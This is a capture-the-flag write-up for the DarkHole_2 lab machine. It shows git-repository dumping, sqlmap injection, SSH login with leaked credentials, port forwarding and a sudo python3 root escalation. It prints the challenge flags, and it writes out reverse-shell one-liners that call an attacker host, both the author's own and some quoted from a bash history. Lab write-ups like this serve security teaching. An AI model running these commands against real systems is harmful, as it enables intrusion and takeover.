# DarkHole_2 Writeup
# Description
```bash
Difficulty:Hard

This works better with VMware rather than VirtualBox

Hint: Don't waste your time For Brute-Force
```
\

# Exploitation
Let's start with network scan
```bash
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 13 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 780                                                                                                                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.104   40:65:d4:5e:e0:3e      2     120  Unknown vendor                                                                                                                                                 
 192.168.0.109   00:0c:29:86:c5:e7      5     300  VMware, Inc.                                                                                                                                                   
 192.168.0.102   d8:80:83:cf:7a:77      5     300  CLOUD NETWORK TECHNOLOGY SINGAPORE PTE. LTD.                                                                                                                   
 192.168.0.1     f0:a7:31:e9:bb:f8      1      60  TP-Link Systems Inc
```
\
NExt, open ports
```bash
Port 22 ssh
Port 80 Apache html
```
\
accessing port 80 on browser
\
<img width="1691" height="707" alt="image" src="https://github.com/user-attachments/assets/113bf1dd-a76d-40a4-a4f2-abafe2f029ab" />
\
Then we run dirb again
```bash
dirb http://192.168.0.109/           

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 18 07:43:54 2026
URL_BASE: http://192.168.0.109/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.109/ ----
+ http://192.168.0.109/.git/HEAD (CODE:200|SIZE:23)                                                                                                                                                               
==> DIRECTORY: http://192.168.0.109/config/                                                                                                                                                                       
+ http://192.168.0.109/index.php (CODE:200|SIZE:740)                                                                                                                                                              
==> DIRECTORY: http://192.168.0.109/js/                                                                                                                                                                           
+ http://192.168.0.109/server-status (CODE:403|SIZE:278)                                                                                                                                                          
==> DIRECTORY: http://192.168.0.109/style/                                                                                                                                                                        
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.109/config/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.109/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.109/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Feb 18 07:43:57 2026
DOWNLOADED: 4612 - FOUND: 3
```
\
We see 2 interesting things "/.git/HEAD" and "/config" 
\
So lets use gitdumper from GitTools (https://github.com/internetwache/GitTools) to get data
```bash
./gitdumper.sh http://192.168.0.109/.git/ ~/cysec/vulnhub/darkhole/2 
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating /home/kali/cysec/vulnhub/darkhole/2/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/0f/1d821f48a9cf662f285457a5ce9af6b9feb2c4
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/aa/2a5f3aa15bb402f2b90a07d86af57436d64917
[+] Downloaded: objects/a4/d900a8d85e8938d3601f3cef113ee293028e10
[+] Downloaded: objects/6e/4328f5f878ed20c0b68fc8bda2133deadc49a3
[+] Downloaded: objects/a2/0488521df2b427246c0155570f5bfad6936c6c
[+] Downloaded: objects/9d/ed9bf70f1f63a852e9e4f02df7b6d325e95c67
[+] Downloaded: objects/66/5001d05a7c0b6428ce22de1ae572c54cba521d
[+] Downloaded: objects/49/151b46cc957717f5529d362115339d4abfe207
[+] Downloaded: objects/32/580f7fb8c39cdad6a7f49839cebfe07f597bcf
[+] Downloaded: objects/8b/6cd9032d268332de09c64cbe9efa63ace3998e
[+] Downloaded: objects/7f/d95a2f170cb55fbb335a56974689f659e2c383
[+] Downloaded: objects/09/04b1923584a0fb0ab31632de47c520db6a6e21
[+] Downloaded: objects/93/9b9aad671e5bcde51b4b5d99b1464e2d52ceaa
[+] Downloaded: objects/77/c09cf4b905b2c537f0a02bca81c6fbf32b9c9d
[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
[+] Downloaded: objects/8a/0ff67b07eb0cc9b7bed4f9094862c22cab2a7d
[+] Downloaded: objects/ca/f37015411ad104985c7dd86373b3a347f71097
[+] Downloaded: objects/c9/56989b29ad0767edc6cf3a202545927c3d1e76
[+] Downloaded: objects/04/4d8b4fec000778de9fb27726de4f0f56edbd0e
[+] Downloaded: objects/4e/b24de5b85be7cf4b2cef3f0cfc83b09a236133
[+] Downloaded: objects/b2/076545503531a2e482a89b84f387e5d44d35c0
[+] Downloaded: objects/56/987e1f75e392aae416571b38b53922c49f6e7e
[+] Downloaded: objects/32/d0928f948af8252b0200ff9cac40534bfe230b
[+] Downloaded: objects/c1/ef127486aa47cd0b3435bca246594a43b559bb
[+] Downloaded: objects/b6/f546da0ab9a91467412383909c8edc9859a363
[+] Downloaded: objects/59/218997bfb0d8012a918e43bea3e497e68248a9
```
\
When i check commit messages
```bash
cat HEAD          
0000000000000000000000000000000000000000 aa2a5f3aa15bb402f2b90a07d86af57436d64917 Jehad Alqurashi <anmar-v7@hotmail.com> 1630317764 +0300       commit (initial): First Initialize
aa2a5f3aa15bb402f2b90a07d86af57436d64917 a4d900a8d85e8938d3601f3cef113ee293028e10 Jehad Alqurashi <anmar-v7@hotmail.com> 1630317980 +0300       commit: I added login.php file with default credentials
a4d900a8d85e8938d3601f3cef113ee293028e10 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 Jehad Alqurashi <anmar-v7@hotmail.com> 1630318472 +0300       commit: i changed login.php file for more secure
```
\
When we check the commit we get credentials
\
<img width="765" height="373" alt="image" src="https://github.com/user-attachments/assets/2b185ff5-b7ee-4319-b05d-31a33dc311a7" />
\
Using that to login at /login.php
\
<img width="1671" height="659" alt="image" src="https://github.com/user-attachments/assets/7095d28d-5cb0-40c0-8233-76bc9db15398" />
\
So i checked for a while , and then tried to change parameter id value
\
<img width="770" height="144" alt="image" src="https://github.com/user-attachments/assets/b8d6be9e-e4fd-435c-a442-4be141873646" />
\
When i put anything other than 1 , the fields were empty , so i udnerstood that the data was being filled from a db 
\
So i save the request and use sqlmap on it
```bash
sqlmap -r req1 --level 3 --risk 3 --dump
Database: darkhole_2
Table: users
[1 entry]
+----+----------------+-------------------------------------------+----------+-----------------------------+----------------+
| id | email          | address                                   | password | username                    | contact_number |
+----+----------------+-------------------------------------------+----------+-----------------------------+----------------+
| 1  | lush@admin.com |  Street, Pincode, Province/State, Country | 321      | Jehad Alqurashiasddasdasdas | 1              |
+----+----------------+-------------------------------------------+----------+-----------------------------+----------------+

[07:54:25] [INFO] table 'darkhole_2.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.0.109/dump/darkhole_2/users.csv'
[07:54:25] [INFO] fetching columns for table 'ssh' in database 'darkhole_2'
[07:54:25] [INFO] fetching entries for table 'ssh' in database 'darkhole_2'
Database: darkhole_2
Table: ssh
[1 entry]
+----+------+--------+
| id | pass | user   |
+----+------+--------+
| 1  | fool | jehad  |
+----+------+--------+
```
\
So it enumerated the db darkhole_2 with 2 tables , users and ssh 
\
So now i think we have password to ssh into the machine
```bash
jehad@192.168.0.109's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 18 Feb 2026 12:58:36 PM UTC

  System load:  0.02               Processes:              239
  Usage of /:   48.1% of 12.73GB   Users logged in:        0
  Memory usage: 19%                IPv4 address for ens33: 192.168.0.109
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Sep  3 05:49:05 2021 from 192.168.135.128
jehad@darkhole:~$ id
uid=1001(jehad) gid=1001(jehad) groups=1001(jehad)
jehad@darkhole:~$ pwd
/home/jehad
jehad@darkhole:~$ ls -la
total 36
drwxr-xr-x 5 jehad jehad 4096 Sep  3  2021 .
drwxr-xr-x 5 root  root  4096 Sep  2  2021 ..
-rw------- 1 jehad jehad 3073 Sep  3  2021 .bash_history
-rw-r--r-- 1 jehad jehad  220 Sep  2  2021 .bash_logout
-rw-r--r-- 1 jehad jehad 3771 Sep  2  2021 .bashrc
drwx------ 2 jehad jehad 4096 Sep  2  2021 .cache
drwxrwxr-x 3 jehad jehad 4096 Sep  2  2021 .local
-rw-r--r-- 1 jehad jehad  807 Sep  2  2021 .profile
drwx------ 2 jehad jehad 4096 Sep  3  2021 .ssh
```
\
I think the author made a mistake of not clearing the .bash_history file , since it contained some important information
```bash
clear
netstat -tulpn | grep LISTEN
ssh -L 127.0.0.1:9999:192.168.135.129:9999 jehad@192.168.135.129
curl http://localhost:9999
curl "http://localhost:999/?cmd=id" 
curl "http://localhost:9999/?cmd=id" 
curl http://localhost:9999/
cd /opt
ls
cd web
ls -la
ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
curl "http://localhost:9999/?cmd=id"
cat /etc/crontab 
exit
curl "http://localhost:9999/?cmd=wget http://google.com"
curl "http://localhost:9999/?cmd=wget&http://google.com"
curl "http://localhost:9999/?cmd=wget%20http://google.com"
curl "http://localhost:9999/?cmd=chmod%20+s%20/bin/bash"
ls -la /usr/bin/bash
curl "http://localhost:9999/?cmd=cat%20/etc/passwd"
curl "http://localhost:9999/?cmd=nc%20-e%20/bin/sh%20192.168.135.128%204242"
curl "http://localhost:9999/?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%20192.168.135.128%204242%20>/tmp/f"
```
\
They are checking for listening ports and did a port fordwarding, so lets check
```bash
jehad@darkhole:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 192.168.0.109:68        0.0.0.0:*                          
jehad@darkhole:~$ curl 127.0.0.1:9999
Parameter GET['cmd']
```
\
So let us also port forward ( i tried with ssh but some error , so i used chisel instead)
```bash
# On target machine
 ./chisel_1.11.3_linux_amd64 client 192.168.0.111:9001 R:9999:127.0.0.1:9999
# ON attacker machine
./chisel_1.11.3_linux_amd64 server -p 9001 --reverse
```
\
<img width="843" height="104" alt="image" src="https://github.com/user-attachments/assets/b5c24747-d96c-45b8-9867-eec0eafe259e" />
\
Then i just use a rev shell payload
```bash
http://127.0.0.1:9999/?cmd=busybox%20nc%20192.168.0.111%204445%20-e%20/bin/sh
```
```bash
penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.111
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from darkhole~192.168.0.109-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/darkhole~192.168.0.109-Linux-x86_64/2026_02_18-08_10_15-939.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
losy@darkhole:/opt/web$ id
uid=1002(losy) gid=1002(losy) groups=1002(losy)
losy@darkhole:/opt/web$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Sep  3  2021 .
drwxr-xr-x 3 root root 4096 Sep  3  2021 ..
-rw-r--r-- 1 root root   95 Sep  3  2021 index.php

```
\
Then again if we check .bash_history file
```bash
cat .bash_history 
clear
ls -la
ss
cat .bash_history 
clear
password:gang
```
\
We notice that a password "gang" is used
```bash
losy@darkhole:/opt/web$ sudo -l
Matching Defaults entries for losy on darkhole:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User losy may run the following commands on darkhole:
    (root) /usr/bin/python3
```
\
Now we just get root access since python3 is very flexible
```bash
losy@darkhole:/opt/web$ sudo -u root /usr/bin/python3 -c "import pty; pty.spawn('/bin/bash')"
root@darkhole:/opt/web# id
uid=0(root) gid=0(root) groups=0(root)
root@darkhole:/opt/web# cd /root
root@darkhole:~# ls -la
total 40
drwx------  5 root root 4096 Sep  3  2021 .
drwxr-xr-x 20 root root 4096 Sep  2  2021 ..
-rw-------  1 root root 1469 Sep  3  2021 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Sep  2  2021 .local
-rw-------  1 root root  535 Sep  3  2021 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   19 Sep  3  2021 root.txt
drwxr-xr-x  3 root root 4096 Sep  2  2021 snap
drwx------  2 root root 4096 Sep  2  2021 .ssh
root@darkhole:~# cat root.txt 
DarkHole{'Legend'}
root@darkhole:~# cat /home/losy/user.txt 
DarkHole{'This_is_the_life_man_better_than_a_cruise'}

```
\
The end , Thank you for reading till here
